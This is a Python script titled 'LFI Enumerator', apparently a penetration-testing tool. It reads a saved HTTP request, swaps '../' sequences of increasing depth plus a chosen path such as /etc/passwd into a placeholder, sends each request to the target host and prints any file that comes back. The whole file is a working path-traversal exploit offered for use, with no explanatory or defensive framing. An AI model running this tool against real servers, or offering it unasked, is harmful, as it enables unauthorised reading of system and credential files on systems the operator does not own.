import requests
import argparse

# Argument parser
parser = argparse.ArgumentParser(description="LFI Enumerator")
parser.add_argument("-i", "--input", required=True, help="Path to the HTTP request file")
args = parser.parse_args()

# Read the request file
request_file = args.input
target_file = input("Enter the file path to enumerate (e.g., /etc/passwd): ").strip()
max_depth = 10  # Adjust based on depth needed

# Read the request file
with open(request_file, "r") as file:
    request_lines = file.readlines()

# Extract host, headers, and request method
host, headers, body, method, url = None, {}, None, None, None

for line in request_lines:
    if line.startswith("GET") or line.startswith("POST"):
        method, url, _ = line.split()
    elif line.lower().startswith("host:"):
        host = line.split(": ")[1].strip()
    elif ": " in line:
        key, value = line.strip().split(": ", 1)
        headers[key] = value
    elif line.strip() == "":
        body = "".join(request_lines[request_lines.index(line) + 1:])  # Capture request body if present

if not host or not method or not url:
    print("[!] Invalid request format. Ensure you have saved a full HTTP request.")
    exit()

# Enumerate the correct depth
for i in range(1, max_depth + 1):
    traversal = "../" * i
    test_url = url.replace("{enumerate}", traversal + target_file)
    full_url = f"http://{host}{test_url}"

    print(f"[*] Trying: {full_url}")

    response = requests.request(method, full_url, headers=headers, data=body)

    if response.status_code == 200 and len(response.text) > 0:
        print("\n[✅] File found at traversal depth:", i)
        print(f"[*] URL: {full_url}\n")
        print("[📄] File Content:\n", response.text)
        break
else:
    print("\n[❌] File not found. Try increasing `max_depth` or using a different path.")
